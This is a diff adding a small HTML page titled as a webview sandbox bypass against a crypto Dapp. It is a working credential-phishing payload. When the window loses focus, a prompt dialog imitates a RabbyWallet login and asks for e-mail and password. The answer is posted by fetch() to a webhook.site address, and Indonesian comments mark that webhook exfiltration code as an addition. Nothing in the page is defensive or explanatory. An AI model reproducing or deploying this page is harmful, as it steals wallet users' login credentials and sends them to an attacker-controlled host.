@@ -1,0 +1,53 @@
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, user-scalable=no">
+	<title>Bypass sandbox Webview UXss Delayed JavaScript execution leak to host app (Dapp)</title>
+	
+	<style>
+		iframe {
+			visibility: hidden;
+		}
+	</style>
+
+	<script>
+
+		/* ====== TAMBAHAN WEBHOOK ====== */
+		const WEBHOOK_URL = "https://webhook.site/12228f9d-ba9f-447b-aa99-c093c16b8162";
+
+		function sendToWebhook(data) {
+			fetch(WEBHOOK_URL, {
+				method: "POST",
+				headers: { "Content-Type": "application/json" },
+				body: JSON.stringify({
+					value: data,
+					time: new Date().toISOString()
+				})
+			});
+		}
+		/* ====== END WEBHOOK ====== */
+
+
+		window.onblur = function () {
+			const result = prompt(
+				"In order to access rabby.io\nyou must first login on your\nRabbyWallet Account.\n\nPlease type your e-mail\nand your password:\n",
+				"E-mail / Password."
+			);
+
+			/* ==== KIRIM KE WEBHOOK === */
+			if (result !== null) {
+				sendToWebhook(result);
+			}
+			/* ==== END ==== */
+
+		}
+	</script>
+</head>
+
+<body>
+	<center>
+		<br>
+		<h1>Click Here</h1>
+	</center>
+	<iframe id="iframe"></iframe>
+</body>
+</html>
